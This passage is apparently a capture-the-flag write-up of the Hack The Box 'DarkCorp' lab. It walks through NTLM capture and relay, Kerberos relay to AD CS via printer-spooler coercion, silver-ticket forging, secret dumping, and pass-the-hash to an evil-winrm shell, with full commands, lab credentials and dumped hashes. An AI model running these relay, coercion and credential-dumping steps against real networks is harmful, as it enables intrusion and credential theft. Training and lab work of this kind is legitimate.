80/tcp   open     http
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
1801/tcp filtered msmq
3003/tcp filtered cgms
5000/tcp open     upnp
5985/tcp open     wsman
```

Testing the creds we had earlier, i started getting issues again

```bash
┌──(darklight㉿ataraxia)-[~/…/ctf/htb/machines/darkcorp]
└─$ nxc smb DC-01 -u users.txt -p passwords.txt

┌──(darklight㉿ataraxia)-[~/…/ctf/htb/machines/darkcorp]
└─$ nxc smb DC-01 -u users.txt -p passwords.txt
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\ebelford:ThePlague61780 STATUS_USER_SESSION_DELETED
SMB         172.16.20.1     445    DC-01            [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         172.16.20.1     445    DC-01            [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\victor.r:victor1gustavo@# STATUS_USER_SESSION_DELETED

```

Going back to `sshuttle` 

It works just fine.

```bash
nxc smb DC-01 -u users.txt -p passwords.txt --no-brute
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\ebelford:ThePlague61780 STATUS_LOGON_FAILURE
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@#
```

And `victor.r` has access to `DC-01`. And also to `WEB-01`

```bash
nxc smb WEB-01 -u users.txt -p passwords.txt --no-brute
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [-] darkcorp.htb\ebelford:ThePlague61780 STATUS_LOGON_FAILURE
SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@#
```

I will let `rusthound-ce` run against the domain controller and see what web app is running on `WEB-01`.

### WEB-01

We have an `IIS` running

![[Pasted_image_20251029095952.png]]

navigating to port `5000`

we are prompted for a username and password, we could try `ebelford` and `victor.r` credentials since those are the only credentials we have.

![[Pasted_image_20251029100131.png]]

We get authenticated with `victor.r` creds. 

![[Pasted_image_20251029100622.png]]

We can check the status of different systems

![[Pasted_image_20251029110628.png]]


for `drip.darkcorp.htb` we have several ports that we can check their status, `80`, `443`, `8080`.
`drip.darkcorp.htb` is the linux box we were on earlier so we can try to listen on any of the three ports and see what request are being made. But if all the ports are in use then this wont be possible.

```bash
ebelford@drip:~$ ss -tlun |grep '443\|8080\|80'
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*
tcp   LISTEN 0      2048       127.0.0.1:8000       0.0.0.0:*
tcp   LISTEN 0      2048       127.0.0.1:8001       0.0.0.0:*
tcp   LISTEN 0      511             [::]:80            [::]:*
```

Only port `80` is in use. We can then proceed to set up a listener on port `8080` and listen for any incoming connects or requests.

We get this 

```bash
ebelford@drip:~$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [172.16.20.3] from (UNKNOWN) [172.16.20.2] 59344
GET / HTTP/1.1
Host: drip.darkcorp.htb:8080
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

Nothing much interesting but that clarifies that the requests being made from `WEB-01` for checking statutes are reaching the specified hosts in this case `drip.darkcorp.htb`. Let's inspect the request being made.

DAMN!! we need to switch to `ssh -D` so that we can configure to use proxychains when forwarding request using burp.

> [!info]
> - `ssh -D` creates a **SOCKS** listener on your machine (e.g. `127.0.0.1:9050`). If Burp is configured to use that SOCKS upstream, Burp will forward connections through the tunnel and the requests **reach the target**.
>     
> - `sshuttle` creates **transparent IP routing** (a routed path), **not** a SOCKS listener. If Burp is still configured to use a SOCKS upstream while you’re using sshuttle, Burp will try to forward via SOCKS and fail — so forwarded requests never reach the target.

To configure burp to use SOCKS upstream we just add this at `settings>network>connections` 

![[Pasted_image_20251029124641.png]]


ensure you are using the port set in your `/etc/proxychains4.conf` at proxy list

```bash
[SNIP]
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 	127.0.0.1 9050
```

#### Capturing NTLM authentication and Relaying

There are two request being made

```
POST /status HTTP/1.1
Host: web-01:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://web-01:5000/check
Content-Type: application/json
Content-Length: 58
Origin: http://web-01:5000
Connection: keep-alive
Priority: u=0

{"protocol":"http","host":"drip.darkcorp.htb","port":"80"}
```

which give us this response

```
HTTP/1.1 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Wed, 29 Oct 2025 09:59:26 GMT
Content-Length: 1293

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
```

Checking at the headers, we know that there is some kind of authentication happening. 

> [!info]
> The `WWW-Authenticate: Negotiate` header signals that the server supports the **SPNEGO (Simple and Protected GSSAPI Negotiation Mechanism)**, a framework that leverages **GSSAPI (Generic Security Service Application Program Interface)** to negotiate the strongest available authentication method. Defined by the IETF (RFC 2078, updated by RFC 2743), GSSAPI abstracts underlying security mechanisms, allowing applications to flexibly support multiple authentication protocols—most commonly **Kerberos v5** in Active Directory environments or **NTLM** as a fallback. When this header is presented, the client responds with a GSSAPI token proposing Kerberos authentication. If the server cannot handle Kerberos, SPNEGO transparently falls back to NTLM, maintaining compatibility across modern and legacy Windows systems.
> 
> In contrast, the `WWW-Authenticate: NTLM` header instructs the client to use the **NTLM challenge-response protocol** directly, bypassing SPNEGO and GSSAPI negotiation. NTLM operates through a three-step handshake: the client initiates a **Type 1 (Negotiate)** message, the server replies with a **Type 2 (Challenge)** that includes a random nonce, and the client completes the exchange with a **Type 3 (Authenticate)** message that incorporates encrypted responses derived from the user’s NT hash. Although NTLM can be encapsulated within SPNEGO for backward compatibility, a standalone `NTLM` header explicitly enforces this older authentication method, typically used in systems where Kerberos is misconfigured, unavailable, or intentionally disabled.

And the second request 

```
POST /status HTTP/1.1
Host: web-01:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://web-01:5000/check
Content-Type: application/json
Content-Length: 58
Origin: http://web-01:5000
Connection: keep-alive
Priority: u=0
Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=

{"protocol":"http","host":"drip.darkcorp.htb","port":"80"}
```

There is an additional header `Authorization`

And we get the response 

```
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
WWW-Authenticate: NTLM TlRMTVNTUAACAAAAEAAQADgAAAAFgokC5q4DsFMer+kAAAAAAAAAAJYAlgBIAAAACgB8TwAAAA9kAGEAcgBrAGMAbwByAHAAAgAQAGQAYQByAGsAYwBvAHIAcAABAAwAVwBFAEIALQAwADEABAAYAGQAYQByAGsAYwBvAHIAcAAuAGgAdABiAAMAJgBXAEUAQgAtADAAMQAuAGQAYQByAGsAYwBvAHIAcAAuAGgAdABiAAUAGABkAGEAcgBrAGMAbwByAHAALgBoAHQAYgAHAAgATUK5vbpI3AEAAAAA
Date: Wed, 29 Oct 2025 09:59:39 GMT
Content-Length: 341

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Not Authorized</TITLE>

[SNIP]
```


The two captured HTTP exchanges show a chained authentication attempt, first, the browser POSTs to `web-01:5000/status` and receives `401` with `WWW-Authenticate: Negotiate, NTLM`, which challenges the browser to authenticate to **web-01** (the browser then replies with an `Authorization: NTLM …` token). Immediately afterwards `web-01` itself makes a POST to `drip.darkcorp.htb:80` and includes an `Authorization: NTLM` token; **drip** responds with a `WWW-Authenticate: NTLM <...>` (the server’s Type-2 challenge) and then returns `401 Not Authorized`. In short: `web-01` did attempt NTLM authentication to `drip`.

You can use wireshark to see the activities clearly.

We could use port 8080 since it is not in use in `drip@darkcorp.htb` then forward the port to our host and use responder to capture authentication being made to `drip.darkcorp.htb`

Am going to use `socat` because we are forwarding a port that will listen at port 8080 on `172.16.20.3`. ssh only forwards port open in loopback `127.0.0.1`.

You can get socat binary [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

To forward the port simply run 

```bash
./socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.10.16.13:80
```

Am forwarding the traffic received on port `8080` to my host through port `80` (default port used by responder)

a simple check if everything is working as expected  we run a status check at port `8080`

![[Pasted_image_20251029135242.png]]

And on our listener on our machine we receive the request. 
```bash
sudo nc -lvnp 80
[sudo] password for darklight:
listening on [any] 80 ...
connect to [10.10.16.13] from (UNKNOWN) [10.10.11.54] 56854
GET / HTTP/1.1
Host: drip.darkcorp.htb:8080
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

Everything is working just fine time to start responder.

```bash
sudo responder -I tun0
```

We capture NTLMv2 hash for `svc-acc`

![[Pasted_image_20251029141740.png]]

Unfortunately the hash does not crack. We could perform a relay since we know that `WEB-01` has message signing disabled.


### Relaying

#### NTLM Relay

By default `LDAP` message signing is not enabled by default on Active Directory domain controllers. This enables us to do NTLM relay.

Simple way to check is message signing is enabled is by use of this commands.

```bash
┌──(darklight㉿ataraxia)-[~/…/ctf/htb/machines/darkcorp]
└─$ nxc ldap 172.16.20.1
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)

┌──(darklight㉿ataraxia)-[~/…/ctf/htb/machines/darkcorp]
└─$ nxc smb 172.16.20.1
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
```

The first command should show us if `LDAP` message signing is enabled.  We can assume it is not enabled since it is the default state.

First of all we need to forward all traffic being received by `drip.darkcorp.htb` at port `8080` to our host. We will again use `socat`

```bash
./socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.10.16.13:9090
```

We are forwarding all traffic to port `9090` on our host.

```bash
impacket-ntlmrelayx -t ldap://172.16.20.1 --http-port 9090
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 9090
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] HTTPD(9090): Client requested path: /
[*] HTTPD(9090): Client requested path: /
[*] HTTPD(9090): Client requested path: /
[*] HTTPD(9090): Connection from 10.10.11.54 controlled, attacking target ldap://172.16.20.1
[*] HTTPD(9090): Client requested path: /
[*] HTTPD(9090): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

We successfully authenticated with `svc-acc` account on `DC-01`.

Attempt to create shadow credentials fails

```bash
impacket-ntlmrelayx -t ldap://172.16.20.1 --http-port 9090 --shadow-credentials
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[SNIP]

[*] HTTPD(9090): Connection from 10.10.11.54 controlled, attacking target ldap://172.16.20.1
[*] HTTPD(9090): Client requested path: /
[*] HTTPD(9090): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Searching for the target account
[*] Target user found: CN=svc_acc,CN=Users,DC=darkcorp,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] Updating the msDS-KeyCredentialLink attribute of SVC_ACC
[-] Could not modify object, the server reports insufficient rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

We can collect AD data and graph it using bloodhound and see what we can do with `svc-acc`.

On outbound object control the user can just enroll to certificates. The user doesn't seem to have any special rights.

![[Pasted_image_20251030103619.png]]

The user is also a member of `DNSAdmins`

![[Pasted_image_20251030103716.png]]

Bloodhound does not show any rights that we get from the group but based on the name we can conclude that we can be able to update DNS entries on `DC-01`.

We can also try to relay `svc-acc` NTLM auth to the certificate service on `DC-01` and try to enroll the user. This involves interacting with the `https` endpoint `/certsrv/certfnsh.asp` which offers alternative ways to request for certificates. For a better understanding check this out https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment


Visiting the endpoint from our browser we get `401`

![[Pasted_image_20251030105422.png]]



```bash
impacket-ntlmrelayx -t https://dc-01.darkcorp.htb/certsrv/certfnsh.asp --http-port 9090 --adcs
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[SNIP]

[*] HTTPD(9090): Client requested path: /
[*] HTTPD(9090): Connection from 10.10.11.54 controlled, attacking target https://dc-01.darkcorp.htb
[-] No NTLM challenge returned from server
[-] HTTPD(9090): Negotiating NTLM with https://dc-01.darkcorp.htb failed
```

Negotiating NTLM with https://dc-01.darkcorp.htb failed, tell us that NTLM auth at that endpoint is not available or supported. We can inspect the request headers for `www-autheticate` 

```bash
curl -I -k https://dc-01.darkcorp.htb/certsrv/certfnsh.asp
HTTP/2 401
content-length: 1293
content-type: text/html
server: Microsoft-IIS/10.0
www-authenticate: Negotiate
x-powered-by: ASP.NET
date: Thu, 30 Oct 2025 08:06:11 GMT
```

We have the header `www-authenticate: Negotiate` this typical means use the strongest auth method available. It does not explicitly mean user `kerberos` as discussed earlier. But since the NTLM negotiation has failed we can try kerberos relay instead.

#### Kerberos Relay

There are multiple ways to perform Kerberos relay:
[[Relaying Kerberos over DNS]]
[[Relaying Kerberos over SMB using krbrelayx]]

We are going to use Kerberos relay over SMB.

Since we know `LDAP` message signing is not enabled in the domain controller. we can relay `svc-acc` auth and create DNS entries that points to us.

Based on the notes in relaying kerberos over SMB, we need to target a DNS server in the domain. We know that by default, when you promote a Windows Server to a Domain Controller (DC), it automatically installs and configures the DNS Server role, and the DC becomes an authoritative DNS server for the Active Directory domain.  So without second thoughts we need to add a DNS entry in the domain that points to us by appending the marshal string to the DC's DNS name 

We can also query DNS records in the domain to identify any DNS servers in the domain

```bash
ebelford@drip:~$ dig @DC-01.darkcorp.htb darkcorp.htb A

; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> @DC-01.darkcorp.htb darkcorp.htb A
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7920
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;darkcorp.htb.			IN	A

;; ANSWER SECTION:
darkcorp.htb.		600	IN	A	172.16.20.1
darkcorp.htb.		600	IN	A	10.10.11.54

;; Query time: 0 msec
;; SERVER: 172.16.20.1#53(DC-01.darkcorp.htb) (UDP)
;; WHEN: Fri Oct 31 04:22:08 MDT 2025
;; MSG SIZE  rcvd: 73
```

In our case it just the domain controller.

##### Step 1 : We create a DNS entry that points to us.

Make sure you are forwarding all traffic being received on `drip.darkcorp.htb` to us.

We then use `ntlmrelayx` to create the DNS record `dc-011UWhRGAAAAAAAAAAIAAAAAAAAAAAAAAAQAAAAAtestKerberoswBAAAA` that points to us, `10.10.16.13`

```bash
impacket-ntlmrelayx -t ldap://172.16.20.1 --http-port 9090 --add-dns-record dc-011UWhRGAAAAAAAAAAIAAAAAAAAAAAAAAAQAAAAAtestKerberoswBAAAA 10.10.16.13
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[SNIP]

[*] HTTPD(9090): Client requested path: /
[*] HTTPD(9090): Connection from 10.10.11.54 controlled, attacking target ldap://172.16.20.1
[*] HTTPD(9090): Client requested path: /
[*] HTTPD(9090): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Checking if domain already has a `dc-011UWhRGAAAAAAAAAAIAAAAAAAAAAAAAAAQAAAAAtestKerberoswBAAAA` DNS record
[*] Domain does not have a `dc-011UWhRGAAAAAAAAAAIAAAAAAAAAAAAAAAQAAAAAtestKerberoswBAAAA` record!
[*] Adding `A` record `dc-011UWhRGAAAAAAAAAAIAAAAAAAAAAAAAAAQAAAAAtestKerberoswBAAAA` pointing to `10.10.16.13` at `DC=dc-011UWhRGAAAAAAAAAAIAAAAAAAAAAAAAAAQAAAAAtestKerberoswBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] Added `A` record `dc-011UWhRGAAAAAAAAAAIAAAAAAAAAAAAAAAQAAAAAtestKerberoswBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

We have added the DNS record.

###### Step 2: We set up krbrelayx

You can get the tool from https://github.com/dirkjanm/krbrelayx.git

We need to relay the authentication will get to `AD CS` service running in the domain controller so that we can end up having a certificate for `web-01$`

```bash
python3 krbrelayx.py -t https://dc-01.darkcorp.htb/certsrv/certfnsh.asp --adcs
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

##### Step 3: We coerce authentication; force `web-01` to authenticate to us

We trick the `web-01` printer spool service to connect/authenticate to us

```bash
python3 printerbug.py 'darkcorp/victor.r':'victor1gustavo@#'@WEB-01.darkcorp.htb dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
[*] Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attempting to trigger authentication via rprn RPC at WEB-01.darkcorp.htb
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
```


And on krbrelayx we get a certificate;`web-01` machine certificate 

```bash
python3 krbrelayx.py -debug -t https://dc-01.darkcorp.htb/certsrv/certfnsh.asp --adcs

[SNIP]

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.11.54
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD: Received connection from 10.10.11.54
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.10.11.54
[*] GOT CERTIFICATE! ID 11
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] Writing PKCS#12 certificate to ./unknown4029.pfx
[*] Certificate successfully written to file
```

This is possible because `WEB-01` has SMB message signing disabled.

##### Step 4: Get NT hash for `web-01$`

With the certificate we can use `certipy-ad` to get `web-01$` NT hash.

```bash
certipy-ad auth -pfx unknown4029.pfx -domain darkcorp.htb -dc-ip 172.16.20.1
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'WEB-01.darkcorp.htb'
[*]     Security Extension SID: 'S-1-5-21-3432610366-2163336488-3604236847-20601'
[*] Using principal: 'web-01$@darkcorp.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'web-01.ccache'
[*] Wrote credential cache to 'web-01.ccache'
[*] Trying to retrieve NT hash for 'web-01$'
[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

##### Step 5: Forge silver ticket

```bash
impacket-ticketer -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain darkcorp.htb -dc-ip 172.16.20.1 -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -spn 'cifs/web-01.darkcorp.htb' Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkcorp.htb/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

##### Step 6 : Dump Secrets

```bash
KRB5CCNAME=Administrator.ccache impacket-secretsdump -k WEB-01.darkcorp.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4cf6d0e998d53752d088e233abb4bed6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
DARKCORP.HTB/svc_acc:$DCC2$10240#svc_acc#3a5485946a63220d3c4b118b36361dbb: (2025-10-31 15:58:28+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
darkcorp\WEB-01$:plain_password_hex:4100520044006c002600710072005a00640022007400230061003d004f00520063005e006b006e004f005d00270034004b0041003a003900390074006200320031006a0040005a004f004f005c004b003b00760075006600210063004f0075002f003c0072005d0043004c004a005800250075006c002d00440064005f006b00380038002c00270049002c0046004000680027003b004500200021003b0042004d005f0064003b0066002300700068005500440069002f0054002300320022005f004c0056004c003c0049006f002600480076002c005d00610034005500470077004a0076005f003400740054004800
darkcorp\WEB-01$:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x1004cecdc9b33080d25a4a29126d4590eb555c5f
dpapi_userkey:0x7f3f9f871ea1dafaea01ae4ccf6e3f7ee535e472
[*] NL$KM
 0000   DD C9 21 14 B9 23 69 1B  D8 BE FD 57 6B 3C 3E E1   ..!..#i....Wk<>.
 0010   9D 3D 3F 74 82 AF 75 33  FD 74 61 6E B7 24 55 AF   .=?t..u3.tan.$U.
 0020   6F 61 A0 BC 2B 2A 86 CF  6E EC E0 D3 37 98 FE E5   oa..+*..n...7...
 0030   14 54 7D A9 A6 45 19 37  F1 20 24 4B 18 43 19 72   .T}..E.7. $K.C.r
NL$KM:ddc92114b923691bd8befd576b3c3ee19d3d3f7482af7533fd74616eb72455af6f61a0bc2b2a86cf6eece0d33798fee514547da9a6451937f120244b18431972
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

![[Pasted_image_20251102141111.png]]

The Administrator hash we are getting is for the local administrator on `web-01$`

```bash
┌──(darklight㉿ataraxia)-[~/…/ctf/htb/machines/darkcorp]
└─$ nxc smb WEB-01 -u Administrator -H 88d84ec08dad123eb04a060a74053f21
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [-] darkcorp.htb\Administrator:88d84ec08dad123eb04a060a74053f21 STATUS_LOGON_FAILURE

┌──(darklight㉿ataraxia)-[~/…/ctf/htb/machines/darkcorp]
└─$ nxc smb WEB-01 -u Administrator -H 88d84ec08dad123eb04a060a74053f21 --local-auth
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:WEB-01) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [+] WEB-01\Administrator:88d84ec08dad123eb04a060a74053f21 (Pwn3d!)
```

First command fails because we are trying to authenticate the domain administrator against `web-01$` adding the `--local-auth` indicates that we are trying to authenticate against the local administrator.

You can then use `evil-winrm` to get a shell on `web-01` and retrieve the user flag

```bash
 evil-winrm -i 172.16.20.2 -u 'Administrator' -H 88d84ec08dad123eb04a060a74053f21

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```


> [!error]
> Lab free access expired I have to subscribe to finish this machine

![[Pasted_image_20251102140204.png]]
